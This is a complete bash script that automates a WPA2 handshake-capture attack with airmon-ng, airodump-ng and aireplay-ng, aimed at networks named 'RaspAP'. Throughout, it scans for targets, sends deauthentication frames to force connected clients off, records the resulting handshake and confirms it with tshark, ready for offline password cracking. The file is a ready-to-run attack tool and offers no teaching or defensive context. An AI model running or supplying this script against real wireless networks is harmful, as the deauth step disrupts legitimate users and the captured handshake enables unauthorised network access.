#!/bin/bash

IFACE="wlan1mon"
CAPDIR="./handshakes"
mkdir -p "$CAPDIR"

echo "[*] Step 1: Scanning for WPA networks. Press Ctrl+C when you see your target."
sleep 2
sudo airmon-ng start wlan1
sudo airodump-ng --encrypt WPA2 "$IFACE" --essid-regex RaspAP

read -p "[?] Enter target BSSID (MAC address): " BSSID
read -p "[?] Enter target channel: " CHANNEL
read -p "[?] Enter ESSID (name): " ESSID

# Sanitize ESSID for filename
SAFE_ESSID=$(echo "$ESSID" | sed 's/[^a-zA-Z0-9_-]/_/g')
CAPFILE="$CAPDIR/${SAFE_ESSID}_handshake"

echo "[*] Step 2: Starting capture on $ESSID ($BSSID) on channel $CHANNEL"
timeout 15s sudo airodump-ng --bssid "$BSSID" --channel "$CHANNEL" --write "$CAPFILE" "$IFACE" &
DUMP_PID=$!

sleep 5
echo "[*] Sending deauth to force handshake..."
sudo aireplay-ng --deauth 5 -a "$BSSID" "$IFACE"

wait $DUMP_PID

CAPFILE="${CAPFILE}-01.cap"
if [ -f "$CAPFILE" ]; then
    echo "[*] Checking for EAPOL packets (handshake)..."
    if tshark -r "$CAPFILE" -Y "eapol" | grep -q "EAPOL"; then
        echo "[+] Handshake successfully captured and saved to: $CAPFILE"
    else
        echo "[-] No handshake found. Deleting capture."
        rm -f "$CAPFILE"
    fi
else
    echo "[!] No .cap file created."
fi
sudo airmon-ng stop wlan1mon
